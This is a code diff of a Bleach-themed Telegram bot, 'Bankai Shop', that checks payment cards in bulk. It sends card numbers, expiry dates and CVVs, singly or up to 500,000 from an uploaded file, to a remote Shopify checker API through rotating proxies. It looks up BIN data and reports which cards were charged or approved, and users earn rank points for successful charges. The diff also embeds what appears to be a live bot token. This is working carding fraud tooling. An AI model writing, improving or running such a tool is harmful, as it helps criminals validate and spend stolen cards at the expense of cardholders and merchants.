@@ -15,377 +15,690 @@ import time
 import json
 import re
 from datetime import datetime
-from dataclasses import dataclass
-from enum import Enum
 
 # ============================================================================
-# 🗡️ BLEACH CONFIGURATION
+# ⚙️ CONFIGURATION - ADD YOUR CREDENTIALS HERE
 # ============================================================================
 
-BOT_TOKEN = '8692888647:AAGBRVuhOBnNe5jIi71o7sLBAYOY6JBsevQ'
-API_ID = 'ADD_YOUR_API_ID'
-API_HASH = 'ADD_YOUR_API_HASH'
+BOT_TOKEN  = '8692888647:AAGBRVuhOBnNe5jIi71o7sLBAYOY6JBsevQ'
+API_ID     = 'ADD_YOUR_API_ID'      # ← from my.telegram.org
+API_HASH   = 'ADD_YOUR_API_HASH'    # ← from my.telegram.org
 
-# Soul Reaper Ranks
-class SoulreaperRank(Enum):
-    ACADEMY_STUDENT = "👨‍🎓 Academy Student"
-    SEATED_OFFICER = "⚔️ Seated Officer"
-    CAPTAIN_CLASS = "👑 Captain Class"
-    KENPACHI = "⚫ Kenpachi"
-    ZERO_SQUAD = "🌟 Royal Guard"
+# Second file's API endpoint (deploy auto.py on Railway and paste URL here)
+CHECKER_API = 'https://web-production-1b828.up.railway.app/shopify'
 
-# Zanpakuto (Spirit Swords)
-ZANPAKUTO = {
-    "⚪ Tensa Zangetsu": "Check Single Card",
-    "🔴 Ryūjin Jakka": "Batch Checker",
-    "🔵 Sōgyo no Kotowari": "Proxy Tester",
-    "💜 Kyōka Suigetsu": "Site Manager",
-    "🟡 Katen Kyōkotsu": "Stats Dashboard",
-}
-
-# Spiritual Power Levels (Reiatsu)
-REIATSU_LEVELS = {
-    "novice": {"level": 1, "power": "🟦 1-10%", "title": "Weak Reiatsu"},
-    "adept": {"level": 2, "power": "🟩 11-30%", "title": "Growing Reiatsu"},
-    "proficient": {"level": 3, "power": "🟪 31-50%", "title": "Strong Reiatsu"},
-    "advanced": {"level": 4, "power": "🟥 51-70%", "title": "Powerful Reiatsu"},
-    "captain": {"level": 5, "power": "⚫ 71-90%", "title": "Captain-Level Reiatsu"},
-    "transcendent": {"level": 6, "power": "⭐ 91-100%", "title": "Transcendent Reiatsu"},
-}
-
-# Files
-PREMIUM_FILE = 'bankai_premium.txt'
-SITES_FILE = 'sites.txt'
-PROXY_FILE = 'proxy.txt'
-SOULS_FILE = 'soul_data.json'
-OWNER_ID = 5895386985
+OWNER_ID       = 5895386985
+PREMIUM_FILE   = 'bankai_premium.txt'
+PROXY_FILE     = 'proxy.txt'
+SOULS_FILE     = 'soul_data.json'
 
 # ============================================================================
-# 🌟 BLEACH EMOJI SYSTEM
+# 🌟 SOUL DATA MANAGEMENT
 # ============================================================================
 
-class BleachEmoji:
-    """Bleach-themed emoji renderer"""
+def load_souls():
+    if not os.path.exists(SOULS_FILE):
+        return {}
+    try:
+        with open(SOULS_FILE, 'r') as f:
+            return json.load(f)
+    except:
+        return {}
 
-    EMOJIS = {
-        "⚔️": "6030452658488218282",
-        "👑": "6032903688949862892",
-        "🔥": "5116414868357907335",
-        "⚫": "5219943216781995020",
-        "💜": "5447453226498552490",
-        "🌟": "5870498447068502918",
-        "🗡️": "5343649643685240676",
-        "🔮": "5447602197439218445",
-        "💀": "6032808241891644148",
-        "⛩️": "5303102515301083665",
-        "👻": "4904936030232117798",
-        "🌙": "5258113901106580375",
-    }
+def save_souls(data):
+    with open(SOULS_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
 
-    @staticmethod
-    def render(text):
-        if not text:
-            return text
-        result = text
-        for emoji, doc_id in BleachEmoji.EMOJIS.items():
-            result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
-        return result
+def get_soul(user_id):
+    souls = load_souls()
+    uid = str(user_id)
+    if uid not in souls:
+        souls[uid] = {
+            "checks": 0, "charged": 0,
+            "approved": 0, "declined": 0,
+            "reiatsu": 0, "joined": datetime.now().isoformat()
+        }
+        save_souls(souls)
+    return souls[uid]
 
-# ============================================================================
-# 🔐 DATA MANAGEMENT
-# ============================================================================
+def update_soul(user_id, soul):
+    souls = load_souls()
+    souls[str(user_id)] = soul
+    save_souls(souls)
 
-class SoulData:
-    """Manage soul/user data"""
+def get_rank(soul):
+    c = soul['checks']
+    if c < 10:   return "👨‍🎓 Academy Student"
+    elif c < 50: return "⚔️ Seated Officer"
+    elif c < 150:return "👑 Captain"
+    elif c < 300:return "⚫ Kenpachi"
+    else:        return "🌟 Royal Guard Zero Squad"
 
-    @staticmethod
-    def load_souls():
-        if not os.path.exists(SOULS_FILE):
-            return {}
-        try:
-            with open(SOULS_FILE, 'r') as f:
-                return json.load(f)
-        except:
-            return {}
-
-    @staticmethod
-    def save_souls(data):
-        with open(SOULS_FILE, 'w') as f:
-            json.dump(data, f, indent=2)
-
-    @staticmethod
-    def get_soul(user_id):
-        souls = SoulData.load_souls()
-        if str(user_id) not in souls:
-            souls[str(user_id)] = {
-                "rank": "ACADEMY_STUDENT",
-                "reiatsu": 0,
-                "checks": 0,
-                "charged": 0,
-                "approved": 0,
-                "declined": 0,
-                "joined": datetime.now().isoformat()
-            }
-            SoulData.save_souls(souls)
-        return souls[str(user_id)]
-
-    @staticmethod
-    def update_soul(user_id, data):
-        souls = SoulData.load_souls()
-        souls[str(user_id)] = data
-        SoulData.save_souls(souls)
+def get_reiatsu_bar(pct):
+    filled = int(pct / 10)
+    bar = "█" * filled + "░" * (10 - filled)
+    return f"[{bar}] {pct}%"
 
 # ============================================================================
-# 📊 CHECKER ENGINE
+# 🔐 PREMIUM CHECK
 # ============================================================================
 
-class CheckerEngine:
-    """Card checking engine"""
+def load_proxies():
+    if not os.path.exists(PROXY_FILE):
+        return []
+    try:
+        with open(PROXY_FILE, 'r') as f:
+            return [l.strip() for l in f if l.strip()]
+    except:
+        return []
 
-    DEAD_KEYWORDS = {
-        'timeout', 'cloudflare', 'access denied', 'ssl error',
-        '502', '503', '504', 'bad gateway', 'connection failed',
-        'captcha required', 'site dead', 'invalid url', 'timed out',
-    }
+def is_premium(user_id):
+    if user_id == OWNER_ID:
+        return True
+    if not os.path.exists(PREMIUM_FILE):
+        return False
+    try:
+        with open(PREMIUM_FILE, 'r') as f:
+            return str(user_id) in [l.strip() for l in f]
+    except:
+        return False
 
-    @staticmethod
-    def is_dead(msg):
-        if not msg:
-            return True
-        msg_lower = str(msg).lower()
-        return any(kw in msg_lower for kw in CheckerEngine.DEAD_KEYWORDS)
-
-    @staticmethod
-    async def check_card(card, site, proxy):
-        """Check single card - connects to Shopify checker API"""
-        if '|' not in card or len(card.split('|')) != 4:
-            return {'status': 'Invalid', 'message': 'Bad format'}
-
-        try:
-            timeout = aiohttp.ClientTimeout(total=30)
-            params = {'cc': card, 'url': site, 'proxy': proxy}
-
-            # Would connect to the second file's API
-            # For now, simulating response
-            return {
-                'status': 'Processing',
-                'message': 'Connected to Zanpakuto Engine',
-                'gateway': 'Shopify',
-                'price': '$--'
-            }
-
-        except asyncio.TimeoutError:
-            return {'status': 'Timeout', 'message': 'Reiatsu transfer failed'}
-        except Exception as e:
-            return {'status': 'Error', 'message': str(e)}
+def extract_cards(text):
+    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
+    matches = re.findall(pattern, text)
+    cards = []
+    for card, mm, yy, cvv in matches:
+        if len(yy) == 2:
+            yy = '20' + yy
+        cards.append(f"{card}|{mm}|{yy}|{cvv}")
+    return cards
 
 # ============================================================================
-# 🎮 BLEACH-THEMED BOT
+# ⚔️ ZANPAKUTO CHECKER ENGINE (Calls second file API)
+# ============================================================================
+
+async def zanpakuto_check(card: str, proxy: str = "") -> dict:
+    """Call the Shopify checker API (second file / Railway endpoint)"""
+    try:
+        params = {'cc': card}
+        if proxy:
+            params['proxy'] = proxy
+
+        timeout = aiohttp.ClientTimeout(total=35)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(CHECKER_API, params=params) as resp:
+                data = await resp.json(content_type=None)
+
+        response  = data.get('Response', '')
+        status    = data.get('Status', '')
+        gate      = data.get('Gate', 'Shopify')
+        price     = data.get('Price', '?')
+        site      = data.get('Site', '-')
+        elapsed   = data.get('Time', '-')
+        receipt   = data.get('Receipt', '')
+        charged   = str(data.get('Charged', 'False')).lower() == 'true'
+        approved  = str(data.get('Approved', 'False')).lower() == 'true'
+
+        if response == 'CHARGED' or charged:
+            return {'status': 'CHARGED', 'gate': gate, 'price': price,
+                    'site': site, 'time': elapsed, 'receipt': receipt,
+                    'raw': response, 'code': status}
+
+        if response == 'APPROVED' or (approved and not charged):
+            return {'status': 'APPROVED', 'gate': gate, 'price': price,
+                    'site': site, 'time': elapsed, 'raw': response, 'code': status}
+
+        if response == 'CARD DECLINED':
+            return {'status': 'DECLINED', 'gate': gate, 'price': price,
+                    'site': site, 'time': elapsed, 'raw': response, 'code': status}
+
+        return {'status': 'ERROR', 'gate': gate, 'price': '?',
+                'site': site, 'time': elapsed, 'raw': response,
+                'code': data.get('ErrorDetail', response)}
+
+    except asyncio.TimeoutError:
+        return {'status': 'TIMEOUT', 'raw': 'Zanpakuto timed out', 'gate': '-',
+                'price': '-', 'site': '-', 'time': '-', 'code': 'TIMEOUT'}
+    except Exception as e:
+        return {'status': 'ERROR', 'raw': str(e), 'gate': '-',
+                'price': '-', 'site': '-', 'time': '-', 'code': 'EXCEPTION'}
+
+async def get_bin_info(card_number: str) -> dict:
+    """Get BIN info"""
+    try:
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as res:
+                if res.status == 200:
+                    return await res.json()
+    except:
+        pass
+    return {}
+
+# ============================================================================
+# 🎮 BOT INIT
 # ============================================================================
 
 bot = TelegramClient('bankai_shop', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+active_sessions = {}
+
+# ============================================================================
+# ⛩️ /start - SOUL SOCIETY PORTAL
+# ============================================================================
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    """Soul Society Portal"""
     user_id = event.sender_id
-    soul = SoulData.get_soul(user_id)
+    soul    = get_soul(user_id)
+    rank    = get_rank(soul)
+    bar     = get_reiatsu_bar(soul['reiatsu'])
 
     buttons = [
         [
-            Button.inline("⚔️ Zanpakuto Menu", data=b"zanpakuto"),
-            Button.inline("🌟 My Reiatsu", data=b"reiatsu"),
+            Button.inline("⚔️  𝗭𝗔𝗡𝗣𝗔𝗞𝗨𝗧𝗢  ⚔️", data=b"zanpakuto"),
         ],
         [
-            Button.inline("👑 Bankai Mode", data=b"bankai"),
-            Button.inline("📊 Soul Stats", data=b"stats"),
+            Button.inline("🌟 𝗦𝗢𝗨𝗟 𝗣𝗢𝗪𝗘𝗥", data=b"reiatsu"),
+            Button.inline("📊 𝗦𝗧𝗔𝗧𝗦", data=b"stats"),
         ],
         [
-            Button.inline("⛩️ Soul Society", data=b"society"),
-            Button.inline("❓ Guide", data=b"guide"),
+            Button.inline("🔥 𝗕𝗔𝗡𝗞𝗔𝗜 𝗠𝗢𝗗𝗘", data=b"bankai"),
+            Button.inline("👻 𝗣𝗥𝗢𝗫𝗬", data=b"proxy_info"),
+        ],
+        [
+            Button.inline("⛩️  𝗦𝗢𝗨𝗟 𝗦𝗢𝗖𝗜𝗘𝗧𝗬  ⛩️", data=b"society"),
         ],
     ]
 
-    msg = BleachEmoji.render(
-        "<b>🔥 BANKAI SHOP 🔥</b>\n"
-        "<b>Soul Reaper Card Checker</b>\n\n"
-        "<b>══════════════════════</b>\n\n"
-        f"<b>👤 Soul ID:</b> <code>{user_id}</code>\n"
-        f"<b>⚔️ Rank:</b> {soul['rank']}\n"
-        f"<b>💜 Reiatsu:</b> {soul['reiatsu']}%\n"
-        f"<b>🔥 Checks:</b> {soul['checks']}\n\n"
-        "<b>══════════════════════</b>\n\n"
-        "<b>⚪ Tensa Zangetsu:</b> Single Card\n"
-        "<b>🔴 Ryūjin Jakka:</b> Batch Mode\n"
-        "<b>🔵 Sōgyo no Kotowari:</b> Proxy Test\n"
-        "<b>💜 Kyōka Suigetsu:</b> Site Manager\n"
-        "<b>🟡 Katen Kyōkotsu:</b> Dashboard\n\n"
-        "<b>🌟 Welcome to Soul Society!</b>"
+    await event.reply(
+        f"<b>『 🔥 𝗕𝗔𝗡𝗞𝗔𝗜 𝗦𝗛𝗢𝗣 🔥 』</b>\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        f"<b>⚫ Soul ID:</b> <code>{user_id}</code>\n"
+        f"<b>⚔️ Rank:</b> {rank}\n"
+        f"<b>💜 Reiatsu:</b> {bar}\n\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        f"<b>⚪ Tensa Zangetsu</b> → Single Check\n"
+        f"<b>🔴 Ryūjin Jakka</b>  → Batch Check\n"
+        f"<b>🔵 Sōgyo no Kotowari</b> → Proxy\n"
+        f"<b>💜 Kyōka Suigetsu</b> → Stats\n\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
+        f"<b>🌟 Powered by Zanpakuto Engine</b>",
+        parse_mode='html',
+        buttons=buttons
     )
 
-    await event.reply(msg, parse_mode='html', buttons=buttons)
+# ============================================================================
+# ⚔️ /cc - SINGLE CARD CHECK
+# ============================================================================
 
-@bot.on(events.NewMessage(pattern=r'^/check\s+'))
+@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
 async def check_single(event):
-    """Check single card - Tensa Zangetsu"""
     user_id = event.sender_id
-    soul = SoulData.get_soul(user_id)
 
-    card = event.message.text.replace('/check ', '').strip()
-
-    if '|' not in card:
-        await event.reply(BleachEmoji.render(
-            "❌ <b>Invalid Format</b>\n\n"
-            "Use: <code>/check CARD|MM|YY|CVV</code>"
-        ), parse_mode='html')
+    if not is_premium(user_id):
+        await event.reply(
+            "<b>⛔ REIATSU INSUFFICIENT</b>\n\n"
+            "Only Soul Reapers with Bankai access can use this.\n"
+            "Contact Soul Society admin.",
+            parse_mode='html'
+        )
         return
 
-    status = await event.reply(BleachEmoji.render(
-        "🗡️ <b>Activating Tensa Zangetsu...</b>\n"
-        "⏳ Gathering Reiatsu..."
-    ))
+    card = event.message.text.replace('/cc ', '').strip()
+    if not re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card):
+        await event.reply(
+            "<b>❌ Invalid Zanpakuto Format</b>\n\n"
+            "Use: <code>/cc CARD|MM|YY|CVV</code>\n"
+            "Example: <code>/cc 4111111111111111|12|25|123</code>",
+            parse_mode='html'
+        )
+        return
+
+    proxies = load_proxies()
+    proxy   = random.choice(proxies) if proxies else ""
+
+    status_msg = await event.reply(
+        "<b>🗡️ Zanpakuto Awakening...</b>\n"
+        "<b>⚡ Charging Reiatsu...</b>\n"
+        "<b>🌀 Initiating Bankai Sequence...</b>",
+        parse_mode='html'
+    )
 
     try:
-        # Simulate check
-        result = await CheckerEngine.check_card(card, "https://example.com", "proxy")
+        result   = await zanpakuto_check(card, proxy)
+        bin_info = await get_bin_info(card.split('|')[0])
 
-        card_masked = f"{card.split('|')[0][:6]}****{card.split('|')[0][-4:]}"
+        card_num    = card.split('|')[0]
+        masked      = f"{card_num[:6]}{'★'*6}{card_num[-4:]}"
+        bank        = bin_info.get('bank', '—')
+        brand       = bin_info.get('brand', '—')
+        country     = bin_info.get('country_name', '—')
+        flag        = bin_info.get('country_flag', '')
+        card_type   = bin_info.get('type', '—')
+        level       = bin_info.get('level', '—')
 
-        # Update soul stats
+        # Status styling
+        st = result['status']
+        if st == 'CHARGED':
+            status_line = "💎 CHARGED ─ ORDER PLACED"
+            border      = "═" * 22
+        elif st == 'APPROVED':
+            status_line = "✅ APPROVED ─ CCN LIVE"
+            border      = "─" * 22
+        elif st == 'DECLINED':
+            status_line = "❌ DECLINED ─ CARD DEAD"
+            border      = "─" * 22
+        elif st == 'TIMEOUT':
+            status_line = "⏳ TIMEOUT ─ SITE DEAD"
+            border      = "─" * 22
+        else:
+            status_line = f"⚠️ ERROR ─ {st}"
+            border      = "─" * 22
+
+        # Update soul
+        soul = get_soul(user_id)
         soul['checks'] += 1
-        soul['reiatsu'] = min(100, soul['reiatsu'] + 5)
-        SoulData.update_soul(user_id, soul)
+        if st == 'CHARGED':
+            soul['charged'] += 1
+            soul['reiatsu'] = min(100, soul['reiatsu'] + 10)
+        elif st == 'APPROVED':
+            soul['approved'] += 1
+            soul['reiatsu'] = min(100, soul['reiatsu'] + 5)
+        else:
+            soul['declined'] += 1
+            soul['reiatsu'] = min(100, soul['reiatsu'] + 1)
+        update_soul(user_id, soul)
 
-        output = BleachEmoji.render(
-            f"<b>⚔️ ZANPAKUTO RESULT</b>\n"
-            f"<b>══════════════════</b>\n"
-            f"<b>Card:</b> {card_masked}\n"
-            f"<b>Status:</b> {result['status']}\n"
-            f"<b>Gateway:</b> {result['gateway']}\n"
-            f"<b>Reiatsu:</b> {soul['reiatsu']}%\n\n"
-            f"<b>📝 Response:</b>\n"
-            f"<code>{result['message'][:100]}</code>"
+        out = (
+            f"<b>『 ⚔️ ZANPAKUTO RESULT 』</b>\n"
+            f"<b>{border}</b>\n\n"
+            f"<b>⚫ Status:</b>  {status_line}\n"
+            f"<b>💳 Card:</b>   <code>{masked}</code>\n"
+            f"<b>🏦 Gate:</b>   {result['gate']}\n"
+            f"<b>💰 Price:</b>  {result['price']}\n"
+            f"<b>🌐 Site:</b>   {result['site']}\n"
+            f"<b>⏱️ Time:</b>   {result['time']}\n\n"
+            f"<b>━━━━━━ BIN INFO ━━━━━━</b>\n"
+            f"<b>🏦 Bank:</b>   {bank}\n"
+            f"<b>💠 Brand:</b>  {brand} {flag}\n"
+            f"<b>🌍 Country:</b>{country}\n"
+            f"<b>📋 Type:</b>   {card_type} | {level}\n\n"
+            f"<b>━━━━━━ RESPONSE ━━━━━━</b>\n"
+            f"<code>{result['code'][:180]}</code>\n\n"
+            f"<b>💜 Reiatsu:</b> {get_reiatsu_bar(soul['reiatsu'])}"
         )
 
-        await status.edit(output, parse_mode='html')
+        if st == 'CHARGED' and result.get('receipt'):
+            out += f"\n<b>🧾 Receipt:</b> {result['receipt']}"
+
+        await status_msg.edit(out, parse_mode='html')
 
     except Exception as e:
-        await status.edit(BleachEmoji.render(f"❌ Error: {str(e)[:100]}"), parse_mode='html')
+        await status_msg.edit(
+            f"<b>❌ Zanpakuto Malfunction</b>\n\n<code>{str(e)[:150]}</code>",
+            parse_mode='html'
+        )
 
 # ============================================================================
-# 🌟 BLEACH CALLBACKS
+# 📄 /chk - BATCH CHECK FROM FILE
+# ============================================================================
+
+@bot.on(events.NewMessage(pattern=r'^/chk'))
+async def check_file(event):
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply("<b>⛔ Bankai Access Required</b>", parse_mode='html')
+        return
+
+    if not event.reply_to_msg_id:
+        await event.reply("<b>❌ Reply to a .txt file containing cards</b>", parse_mode='html')
+        return
+
+    reply = await event.get_reply_message()
+    if not reply.file or not reply.file.name.endswith('.txt'):
+        await event.reply("<b>❌ Must be a .txt file</b>", parse_mode='html')
+        return
+
+    proxies    = load_proxies()
+    status_msg = await event.reply("<b>🌀 Soul Society processing file...</b>", parse_mode='html')
+    file_path  = await reply.download_media()
+
+    try:
+        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = await f.read()
+
+        cards = extract_cards(content)
+        if not cards:
+            await status_msg.edit("<b>❌ No valid cards found in file</b>", parse_mode='html')
+            return
+
+        total   = min(len(cards), 500000)
+        results = {'charged': 0, 'approved': 0, 'declined': 0, 'error': 0,
+                   'checked': 0, 'start': time.time()}
+        hits    = []
+
+        sid = f"{user_id}_{status_msg.id}"
+        active_sessions[sid] = {'paused': False, 'stopped': False}
+
+        await status_msg.edit(
+            f"<b>🔥 BANKAI BATCH MODE ACTIVATED</b>\n\n"
+            f"<b>⚔️ Cards:</b> {total}\n"
+            f"<b>🌀 Initializing Zanpakuto Engine...</b>",
+            parse_mode='html'
+        )
+
+        buttons = [
+            [
+                Button.inline("⏸️ Pause", data=f"pause_{sid}".encode()),
+                Button.inline("🛑 Stop",  data=f"stop_{sid}".encode()),
+            ]
+        ]
+
+        for card in cards[:total]:
+            if sid not in active_sessions or active_sessions[sid]['stopped']:
+                break
+            while active_sessions[sid]['paused']:
+                await asyncio.sleep(1)
+
+            proxy  = random.choice(proxies) if proxies else ""
+            result = await zanpakuto_check(card, proxy)
+            st     = result['status']
+
+            if st == 'CHARGED':
+                results['charged'] += 1
+                hits.append(f"💎 CHARGED | {card} | {result['site']} | {result['price']}")
+            elif st == 'APPROVED':
+                results['approved'] += 1
+                hits.append(f"✅ APPROVED | {card} | {result['site']}")
+            elif st == 'DECLINED':
+                results['declined'] += 1
+            else:
+                results['error'] += 1
+
+            results['checked'] += 1
+
+            if results['checked'] % 15 == 0:
+                elapsed = int(time.time() - results['start'])
+                total_done = results['checked']
+                pct = int(total_done / total * 100)
+                prog_bar = "█" * int(pct/10) + "░" * (10 - int(pct/10))
+
+                await status_msg.edit(
+                    f"<b>『 🔥 BANKAI BATCH ACTIVE 』</b>\n\n"
+                    f"<b>Progress:</b> [{prog_bar}] {pct}%\n"
+                    f"<b>Checked:</b>  {total_done}/{total}\n\n"
+                    f"<b>💎 Charged:</b>  {results['charged']}\n"
+                    f"<b>✅ Approved:</b> {results['approved']}\n"
+                    f"<b>❌ Declined:</b> {results['declined']}\n"
+                    f"<b>⚠️ Errors:</b>   {results['error']}\n\n"
+                    f"<b>⏱️ Time:</b> {elapsed}s",
+                    parse_mode='html',
+                    buttons=buttons
+                )
+
+        elapsed = int(time.time() - results['start'])
+        final   = (
+            f"<b>『 ✅ BANKAI COMPLETE 』</b>\n\n"
+            f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
+            f"<b>Total:</b>    {total}\n"
+            f"<b>Checked:</b>  {results['checked']}\n\n"
+            f"<b>💎 Charged:</b>  {results['charged']}\n"
+            f"<b>✅ Approved:</b> {results['approved']}\n"
+            f"<b>❌ Declined:</b> {results['declined']}\n"
+            f"<b>⚠️ Errors:</b>   {results['error']}\n\n"
+            f"<b>⏱️ Time:</b> {elapsed}s"
+        )
+
+        if hits:
+            final += "\n\n<b>━━━━━ HITS ━━━━━</b>\n"
+            final += "\n".join(hits[:20])
+
+        await status_msg.edit(final, parse_mode='html')
+
+        if sid in active_sessions:
+            del active_sessions[sid]
+
+    except Exception as e:
+        await status_msg.edit(f"<b>❌ Error: {str(e)[:100]}</b>", parse_mode='html')
+    finally:
+        if os.path.exists(file_path):
+            os.remove(file_path)
+
+# ============================================================================
+# 🎮 CALLBACK HANDLERS
 # ============================================================================
 
 @bot.on(events.CallbackQuery(pattern=b"zanpakuto"))
 async def zanpakuto_menu(event):
-    """Zanpakuto Selection"""
     buttons = [
-        [Button.inline("⚪ Tensa Zangetsu", data=b"check_single")],
-        [Button.inline("🔴 Ryūjin Jakka", data=b"batch_mode")],
-        [Button.inline("🔵 Sōgyo no Kotowari", data=b"proxy_test")],
-        [Button.inline("💜 Kyōka Suigetsu", data=b"site_mgr")],
-        [Button.inline("🟡 Katen Kyōkotsu", data=b"dashboard")],
+        [Button.inline("⚪ Tensa Zangetsu — Single Check",   data=b"usage_cc")],
+        [Button.inline("🔴 Ryūjin Jakka — Batch Check",      data=b"usage_chk")],
+        [Button.inline("🔵 Sōgyo no Kotowari — Proxy Info",  data=b"proxy_info")],
+        [Button.inline("💜 Kyōka Suigetsu — My Stats",       data=b"stats")],
+        [Button.inline("🟡 Katen Kyōkotsu — API Status",     data=b"api_status")],
+        [Button.inline("🔙 Back", data=b"back_start")],
     ]
 
-    msg = BleachEmoji.render(
-        "<b>⚔️ ZANPAKUTO ARSENAL</b>\n\n"
-        "<b>Select your spirit sword:</b>\n\n"
+    await event.edit(
+        "<b>⚔️ 『 ZANPAKUTO ARSENAL 』</b>\n\n"
+        "<b>Choose your spirit sword:</b>\n\n"
         "⚪ <b>Tensa Zangetsu</b>\n"
-        "└─ Check single cards\n\n"
+        "└ Check single card\n\n"
         "🔴 <b>Ryūjin Jakka</b>\n"
-        "└─ Batch processing\n\n"
+        "└ Batch check from .txt file\n\n"
         "🔵 <b>Sōgyo no Kotowari</b>\n"
-        "└─ Proxy testing\n\n"
+        "└ Proxy management\n\n"
         "💜 <b>Kyōka Suigetsu</b>\n"
-        "└─ Site management\n\n"
+        "└ View your soul stats\n\n"
         "🟡 <b>Katen Kyōkotsu</b>\n"
-        "└─ Live dashboard"
+        "└ Check API online status",
+        parse_mode='html',
+        buttons=buttons
     )
+    await event.answer()
 
-    await event.edit(msg, parse_mode='html', buttons=buttons)
+@bot.on(events.CallbackQuery(pattern=b"usage_cc"))
+async def usage_cc(event):
+    await event.edit(
+        "<b>⚪ 𝗧𝗲𝗻𝘀𝗮 𝗭𝗮𝗻𝗴𝗲𝘁𝘀𝘂 — Single Check</b>\n\n"
+        "<b>Command:</b>\n"
+        "<code>/cc CARD|MM|YY|CVV</code>\n\n"
+        "<b>Example:</b>\n"
+        "<code>/cc 4111111111111111|12|25|123</code>\n\n"
+        "<b>Returns:</b>\n"
+        "• Status (Charged/Approved/Declined)\n"
+        "• Gateway & Price\n"
+        "• BIN Info (Bank, Brand, Country)\n"
+        "• Response code\n"
+        "• Reiatsu update",
+        parse_mode='html'
+    )
+    await event.answer()
+
+@bot.on(events.CallbackQuery(pattern=b"usage_chk"))
+async def usage_chk(event):
+    await event.edit(
+        "<b>🔴 𝗥𝘆ū𝗷𝗶𝗻 𝗝𝗮𝗸𝗸𝗮 — Batch Check</b>\n\n"
+        "<b>How to use:</b>\n"
+        "1. Upload a .txt file with cards\n"
+        "2. Reply to that file with <code>/chk</code>\n\n"
+        "<b>Card format in file:</b>\n"
+        "<code>4111111111111111|12|25|123</code>\n\n"
+        "<b>Features:</b>\n"
+        "• Live progress bar\n"
+        "• Pause / Stop controls\n"
+        "• Hits summary at end\n"
+        "• Reiatsu gained per check",
+        parse_mode='html'
+    )
+    await event.answer()
+
+@bot.on(events.CallbackQuery(pattern=b"stats"))
+async def stats_handler(event):
+    user_id = event.sender_id
+    soul    = get_soul(user_id)
+    rank    = get_rank(soul)
+    bar     = get_reiatsu_bar(soul['reiatsu'])
+
+    total = soul['checks']
+    hr    = f"{soul['charged']/total*100:.1f}%" if total > 0 else "0%"
+    ar    = f"{soul['approved']/total*100:.1f}%" if total > 0 else "0%"
+
+    await event.edit(
+        f"<b>📊 『 SOUL STATS 』</b>\n\n"
+        f"<b>⚔️ Rank:</b>     {rank}\n"
+        f"<b>💜 Reiatsu:</b>  {bar}\n\n"
+        f"<b>━━━━━━ CHECKER ━━━━━━</b>\n"
+        f"<b>Total Checks:</b>  {soul['checks']}\n"
+        f"<b>💎 Charged:</b>    {soul['charged']} ({hr})\n"
+        f"<b>✅ Approved:</b>   {soul['approved']} ({ar})\n"
+        f"<b>❌ Declined:</b>   {soul['declined']}\n\n"
+        f"<b>━━━━━ NEXT RANK ━━━━━</b>\n"
+        f"<b>Checks to next rank:</b> {max(0, [10,50,150,300][min(3, ['Academy','Seated','Captain','Kenpachi'].index(rank.split()[0]) if any(x in rank for x in ['Academy','Seated','Captain','Kenpachi']) else 3)] - soul['checks'])}",
+        parse_mode='html'
+    )
     await event.answer()
 
 @bot.on(events.CallbackQuery(pattern=b"reiatsu"))
-async def reiatsu_check(event):
-    """Spiritual Power Check"""
+async def reiatsu_handler(event):
     user_id = event.sender_id
-    soul = SoulData.get_soul(user_id)
+    soul    = get_soul(user_id)
+    pct     = soul['reiatsu']
+    bar     = get_reiatsu_bar(pct)
 
-    reiatsu = soul['reiatsu']
+    if pct < 20:   lvl = "🟦 Academy Student"
+    elif pct < 40: lvl = "🟩 Seated Officer"
+    elif pct < 60: lvl = "🟪 Captain Class"
+    elif pct < 80: lvl = "🟥 Kenpachi Level"
+    else:          lvl = "⭐ Zero Squad"
 
-    if reiatsu < 20:
-        level_info = "🟦 Weak - Academy Student Level"
-    elif reiatsu < 40:
-        level_info = "🟩 Growing - Seated Officer Level"
-    elif reiatsu < 60:
-        level_info = "🟪 Strong - Captain Class"
-    elif reiatsu < 80:
-        level_info = "🟥 Powerful - Kenpachi Level"
-    else:
-        level_info = "⭐ Transcendent - Zero Squad Level"
-
-    msg = BleachEmoji.render(
-        "<b>💜 REIATSU STATUS</b>\n\n"
-        f"<b>Power Level:</b> {reiatsu}%\n"
-        f"<b>Classification:</b> {level_info}\n\n"
-        f"<b>📊 Total Checks:</b> {soul['checks']}\n"
-        f"<b>💎 Charged:</b> {soul['charged']}\n"
-        f"<b>✅ Approved:</b> {soul['approved']}\n"
-        f"<b>❌ Declined:</b> {soul['declined']}"
+    await event.edit(
+        f"<b>💜 『 REIATSU POWER 』</b>\n\n"
+        f"<b>Level:</b>  {lvl}\n"
+        f"<b>Power:</b>  {bar}\n\n"
+        f"<b>How to raise Reiatsu:</b>\n"
+        f"⚡ Charged = +10%\n"
+        f"✅ Approved = +5%\n"
+        f"❌ Declined = +1%",
+        parse_mode='html'
     )
-
-    await event.edit(msg, parse_mode='html')
     await event.answer()
 
 @bot.on(events.CallbackQuery(pattern=b"bankai"))
-async def bankai_mode(event):
-    """Bankai Activation"""
-    msg = BleachEmoji.render(
-        "<b>🔥 BANKAI ACTIVATION 🔥</b>\n\n"
-        "<b>⚠️ WARNING ⚠️</b>\n\n"
-        "Unlocking hidden capabilities...\n\n"
-        "🌀 Channeling Zanpakuto Spirit...\n"
-        "💥 Releasing Power Limiter...\n"
-        "⚫ Entering Bankai Mode...\n\n"
-        "<b>✨ Premium features unlocked!</b>\n\n"
-        "• Unlimited checks\n"
-        "• Faster processing\n"
